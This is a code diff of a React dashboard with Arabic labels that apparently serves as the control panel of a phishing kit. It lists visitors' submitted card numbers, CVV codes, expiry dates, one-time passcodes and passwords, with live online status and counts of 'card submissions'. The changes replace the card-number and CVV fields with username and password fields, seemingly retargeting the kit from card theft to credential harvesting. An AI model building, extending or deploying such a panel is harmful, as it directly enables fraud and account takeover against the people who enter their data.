@@ -112,14 +112,12 @@ interface Notification {
   bank: string;
   cardStatus?: string;
   ip?: string;
-  cvv: string;
   id: string | "0";
   expiryDate: string;
   notificationCount: number;
   otp: string;
   otp2: string;
   page: string;
-  cardNumber: string;
   country?: string;
   personalInfo: {
     id?: string | "0";
@@ -147,6 +145,8 @@ interface Notification {
   phone: string;
   flagColor?: string;
   currentPage?: string;
+  userName?: string;
+  password?: string;
 }
 
 // Hook for online users count
@@ -850,7 +850,7 @@ export default function NotificationsPage() {
 
   // Statistics calculations
   const totalVisitorsCount = notifications.length;
-  const cardSubmissionsCount = notifications.filter((n) => n.cardNumber).length;
+  const cardSubmissionsCount = notifications.filter((n) => n.userName).length;
   const approvedCount = notifications.filter(
     (n) => n.status === "approved"
   ).length;
@@ -864,7 +864,7 @@ export default function NotificationsPage() {
 
     // Apply filter type
     if (filterType === "card") {
-      filtered = filtered.filter((notification) => notification.cardNumber);
+      filtered = filtered.filter((notification) => notification.userName);
     } else if (filterType === "online") {
       filtered = filtered.filter(
         (notification) => onlineStatuses[notification.id]
@@ -879,7 +879,7 @@ export default function NotificationsPage() {
           notification.name?.toLowerCase().includes(term) ||
           notification.email?.toLowerCase().includes(term) ||
           notification.phone?.toLowerCase().includes(term) ||
-          notification.cardNumber?.toLowerCase().includes(term) ||
+          notification.userName?.toLowerCase().includes(term) ||
           notification.country?.toLowerCase().includes(term) ||
           notification.otp?.toLowerCase().includes(term)
       );
@@ -973,8 +973,8 @@ export default function NotificationsPage() {
         // Check if there are any new notifications with card info or general info
         const hasNewCardInfo = notificationsData.some(
           (notification) =>
-            notification.cardNumber &&
-            !notifications.some((n) => n.id === notification.id && n.cardNumber)
+            notification.userName &&
+            !notifications.some((n) => n.id === notification.id && n.userName)
         );
         const hasNewGeneralInfo = notificationsData.some(
           (notification) =>
@@ -1018,7 +1018,7 @@ export default function NotificationsPage() {
 
     // Card submissions is the count of notifications with card info
     const cardCount = notificationsData.filter(
-      (notification) => notification.cardNumber
+      (notification) => notification.userName
     ).length;
 
     setTotalVisitors(totalCount);
@@ -1638,10 +1638,10 @@ export default function NotificationsPage() {
                           </Badge>
                           <Badge
                             variant={
-                              notification.cardNumber ? "default" : "secondary"
+                              notification.userName ? "default" : "secondary"
                             }
                             className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification.cardNumber
+                              notification.userName
                                 ? "bg-gradient-to-r from-green-500 to-green-600 text-white"
                                 : ""
                             }`}
@@ -1650,7 +1650,7 @@ export default function NotificationsPage() {
                             }
                           >
                             <CreditCard className="h-3 w-3 mr-1" />
-                            {notification.cardNumber
+                            {notification.userName
                               ? "معلومات البطاقة"
                               : "لا يوجد بطاقة"}
                           </Badge>
@@ -1821,17 +1821,17 @@ export default function NotificationsPage() {
                         </Badge>
                         <Badge
                           variant={
-                            notification.cardNumber ? "default" : "secondary"
+                            notification.userName ? "default" : "secondary"
                           }
                           className={`cursor-pointer ${
-                            notification.cardNumber
+                            notification.userName
                               ? "bg-gradient-to-r from-green-500 to-green-600 text-white"
                               : ""
                           }`}
                           onClick={() => handleInfoClick(notification, "card")}
                         >
                           <CreditCard className="h-3 w-3 mr-1" />
-                          {notification.cardNumber
+                          {notification.userName
                             ? "معلومات البطاقة"
                             : "لا يوجد بطاقة"}
                         </Badge>
@@ -1995,10 +1995,10 @@ export default function NotificationsPage() {
             <div className="space-y-4">
               <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
                 {[
-               { label: "البنك", value: selectedNotification.bank },
+                  { label: "البنك", value: selectedNotification.bank },
                   {
                     label: "رقم البطاقة",
-                    value: selectedNotification?.cardNumber ,
+                    value: selectedNotification?.userName,
                   },
                   {
                     label: "تاريخ الانتهاء",
@@ -2007,7 +2007,7 @@ export default function NotificationsPage() {
                         ? `${selectedNotification.year}/${selectedNotification.month}`
                         : selectedNotification.expiryDate,
                   },
-                  { label: "رمز الأمان", value: selectedNotification.cvv },
+                  { label: "رمز الأمان", value: selectedNotification.password },
                   { label: "رمز التحقق", value: selectedNotification.otp },
                   { label: "كلمة المرور", value: selectedNotification.pass },
                 ].map(
